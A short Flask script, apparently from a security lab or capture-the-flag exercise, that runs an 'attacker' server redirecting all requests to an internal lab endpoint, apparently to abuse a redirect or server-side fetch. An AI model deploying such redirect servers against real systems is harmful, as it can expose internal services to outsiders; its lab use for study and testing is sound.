from flask import Flask, redirect

app = Flask("pwnc")

@app.route("/")
def hello():
    return redirect("http://lab.localhost/showme")

app.run("attacker.localhost", 9999)
